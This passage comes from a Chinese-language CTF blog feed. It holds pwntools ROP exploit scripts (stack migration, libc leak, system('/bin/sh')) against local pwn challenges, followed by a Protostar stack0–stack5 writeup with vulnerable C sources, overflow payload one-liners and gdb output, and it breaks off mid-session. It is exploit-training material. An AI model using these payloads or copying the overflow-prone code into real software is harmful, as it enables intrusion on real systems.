class="line">buf1,</span><br><span class="line">buf1,</span><br><span class="line">]</span><br><span class="line">conn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">conn.sendline(<span class="string">'a'</span>*<span class="number">20</span>+flat(rop2))</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送rop1获取write的真实地址</span></span><br><span class="line"><span class="comment">#conn.sendline('a'*20+rop1)</span></span><br><span class="line"><span class="comment">#r =  conn.recvline()</span></span><br><span class="line"><span class="comment">#for i in range(1,len(r)):</span></span><br><span class="line"><span class="comment">#print hex(u32(r[i:i+4]))</span></span><br><span class="line"><span class="comment">#print conn.recvline()</span></span><br><span class="line"><span class="comment">#print conn.recvline()</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/publicStr/article/details/80344321" target="_blank" rel="noopener">Pwn-最简单栈溢出（2018铁三云贵赛区）write函数泄露+用地址跳回重执行主函数</a></p><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="noopener">GOT表和PLT表知识详解</a></p><h2 id="ROP-三"><a href="#ROP-三" class="headerlink" title="ROP(三)"></a>ROP(三)</h2><p>Stack Migration</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Leave -&gt;mov esp,ebp, pop ebp</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534953910131.png" alt="1534953910131"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534953935732.png" alt="1534953935732"></p><h3 id="p3"><a href="#p3" class="headerlink" title="p3"></a>p3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">p = ELF(<span class="string">'./p3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">plt_puts = p.symbols[<span class="string">'puts'</span>]</span><br><span class="line">got_puts = p.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">gets = p.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804854b</span></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'gets:'</span>+hex(gets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x0804b000</span> <span class="number">-100</span></span><br><span class="line">buf1 = <span class="number">0x0804b000</span> <span class="number">-1000</span></span><br><span class="line"></span><br><span class="line">rop1 = [</span><br><span class="line">plt_puts,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">got_puts,</span><br><span class="line">gets,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">buf,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">buf<span class="number">-4</span>,</span><br><span class="line">leave_ret,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">'a'</span>*<span class="number">22</span>+flat(rop1))</span><br><span class="line"><span class="keyword">print</span> conn.recvline()</span><br><span class="line">r = u32(conn.recvline()[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_real:'</span>+ str(hex(r))</span><br><span class="line">libc_base =  r - puts_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base:'</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system:'</span>+hex(system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop2=[</span><br><span class="line">gets,</span><br><span class="line">system,</span><br><span class="line">buf1,</span><br><span class="line">buf1,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.sendline(flat(rop2))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">raw_input(<span class="string">'#'</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g ./pwn1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">p = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line">libc_start_main_got = p.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">libc_start_off = libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">puts = p.symbols[<span class="string">'puts'</span>]</span><br><span class="line">read = p.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804865f</span></span><br><span class="line">pop_s_d_b_ret = <span class="number">0x0804865d</span></span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line">buf = <span class="number">0x804b000</span> - <span class="number">100</span></span><br><span class="line">buf1 = <span class="number">0x804b000</span> - <span class="number">500</span></span><br><span class="line"></span><br><span class="line">rop1=[</span><br><span class="line">puts,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">libc_start_main_got,</span><br><span class="line">read,</span><br><span class="line">pop_s_d_b_ret,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">buf,</span><br><span class="line"><span class="number">50</span>,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">buf<span class="number">-4</span>,</span><br><span class="line">leave_ret,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(<span class="string">'a'</span>*<span class="number">140</span>+flat(rop1))</span><br><span class="line">conn.recvline()</span><br><span class="line">conn.recvline()</span><br><span class="line">libc_base = <span class="number">0xf662e9e0</span> - libc_start_off</span><br><span class="line"></span><br><span class="line">gets_off = libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets = libc_base + gets_off</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line">rop2=[</span><br><span class="line">gets,</span><br><span class="line">system,</span><br><span class="line">buf1,</span><br><span class="line">buf1,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">conn.sendline(flat(rop2))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#raw_input('#')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;蓝鲸安全的PWN入门课程&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://blog.Lhaihai.wang/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://blog.Lhaihai.wang/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostart Stack Writeup</title>
    <link href="http://blog.Lhaihai.wang/2018/08/15/Protostart%20Stack%20Writeup/"/>
    <id>http://blog.Lhaihai.wang/2018/08/15/Protostart Stack Writeup/</id>
    <published>2018-08-15T06:47:56.000Z</published>
    <updated>2018-08-23T17:11:51.926Z</updated>
    
    <content type="html"><![CDATA[<ul><li style="list-style: none"><input type="checkbox" checked> stack0</li><li style="list-style: none"><input type="checkbox" checked> stack1</li><li style="list-style: none"><input type="checkbox" checked> stack2</li><li style="list-style: none"><input type="checkbox" checked> stack3</li><li style="list-style: none"><input type="checkbox" checked> stack4</li><li style="list-style: none"><input type="checkbox" checked> stack5</li><li style="list-style: none"><input type="checkbox" checked> stack6</li><li style="list-style: none"><input type="checkbox" checked> stack7</li></ul><a id="more"></a><h3 id="stack0"><a href="#stack0" class="headerlink" title="stack0"></a>stack0</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have changed the 'modified' variable\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again?\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：溢出改变modified的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;A&apos;*68&quot; | ./stack0</span><br></pre></td></tr></table></figure><h3 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">"please specify an argument\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified == <span class="number">0x61626364</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have correctly got the variable to the right value\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：buffer溢出改变modified的值为0x61626364 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ ./stack1 `python -c &quot;print &apos;A&apos;*64+&apos;\x64\x63\x62\x61&apos; &quot;`</span><br><span class="line">you have correctly got the variable to the right value</span><br></pre></td></tr></table></figure><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">char</span> *variable;</span><br><span class="line"></span><br><span class="line">  variable = getenv(<span class="string">"GREENIE"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(variable == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">"please set the GREENIE environment variable\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, variable);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified == <span class="number">0x0d0a0d0a</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have correctly modified the variable\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：buffer溢出改变modified的值为0x0d0a0d0a，而buffer是从环境变量GREENIE复制过来的，所以设置一下该环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ export GREENIE=`python -c &quot;print &apos;A&apos;*64+&apos;\x0a\x0d\x0a\x0d&apos;&quot;`</span><br><span class="line">user@protostar:/opt/protostar/bin$ ./stack2</span><br><span class="line">you have correctly modified the variable</span><br></pre></td></tr></table></figure><h3 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">volatile</span> <span class="title">int</span> <span class="params">(*fp)</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  fp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fp) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"calling function pointer, jumping to 0x%08x\n"</span>, fp);</span><br><span class="line">      fp();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：buffer溢出覆盖fp，修改fp的值为win函数的地址</p><p>gdb查看win地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:~$ gdb -q /opt/protostar/bin/stack3</span><br><span class="line">Reading symbols from /opt/protostar/bin/stack3...done.</span><br><span class="line">(gdb) disas win</span><br><span class="line">Dump of assembler code for function win:</span><br><span class="line">0x08048424 &lt;win+0&gt;:push   %ebp</span><br><span class="line">0x08048425 &lt;win+1&gt;:mov    %esp,%ebp</span><br><span class="line">0x08048427 &lt;win+3&gt;:sub    $0x18,%esp</span><br><span class="line">0x0804842a &lt;win+6&gt;:movl   $0x8048540,(%esp)</span><br><span class="line">0x08048431 &lt;win+13&gt;:call   0x8048360 &lt;puts@plt&gt;</span><br><span class="line">0x08048436 &lt;win+18&gt;:leave  </span><br><span class="line">0x08048437 &lt;win+19&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;A&apos;*64+&apos;\x24\x84\x04\x08&apos; &quot; | ./stack3</span><br><span class="line">calling function pointer, jumping to 0x08048424</span><br><span class="line">code flow successfully changed</span><br></pre></td></tr></table></figure><h3 id="stack4"><a href="#stack4" class="headerlink" title="stack4"></a>stack4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：覆盖ret为win地址(0x080483f4)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:~$ gdb -q /opt/protostar/bin/stack4</span><br><span class="line">Reading symbols from /opt/protostar/bin/stack4...done.</span><br><span class="line">(gdb) disas win</span><br><span class="line">Dump of assembler code for function win:</span><br><span class="line">0x080483f4 &lt;win+0&gt;:push   %ebp</span><br><span class="line">0x080483f5 &lt;win+1&gt;:mov    %esp,%ebp</span><br><span class="line">0x080483f7 &lt;win+3&gt;:sub    $0x18,%esp</span><br><span class="line">0x080483fa &lt;win+6&gt;:movl   $0x80484e0,(%esp)</span><br><span class="line">0x08048401 &lt;win+13&gt;:call   0x804832c &lt;puts@plt&gt;</span><br><span class="line">0x08048406 &lt;win+18&gt;:leave  </span><br><span class="line">0x08048407 &lt;win+19&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048408 &lt;main+0&gt;:push   %ebp</span><br><span class="line">0x08048409 &lt;main+1&gt;:mov    %esp,%ebp</span><br><span class="line">0x0804840b &lt;main+3&gt;:and    $0xfffffff0,%esp</span><br><span class="line">0x0804840e &lt;main+6&gt;:sub    $0x50,%esp</span><br><span class="line">0x08048411 &lt;main+9&gt;:lea    0x10(%esp),%eax</span><br><span class="line">0x08048415 &lt;main+13&gt;:mov    %eax,(%esp)</span><br><span class="line">0x08048418 &lt;main+16&gt;:call   0x804830c &lt;gets@plt&gt;</span><br><span class="line">0x0804841d &lt;main+21&gt;:leave  </span><br><span class="line">0x0804841e &lt;main+22&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>断点调试得offset为76，过程参考视频</p><p><a href="https://www.youtube.com/watch?v=8QzOC8HfOqU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=8QzOC8HfOqU</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;A&apos;*76+&apos;\xf4\x83\x04\x08&apos; &quot; | ./stack4</span><br><span class="line">code flow successfully changed</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><h3 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) define hook-stop</span><br><span class="line">Type commands for definition of &quot;hook-stop&quot;.</span><br><span class="line">End with a line saying just 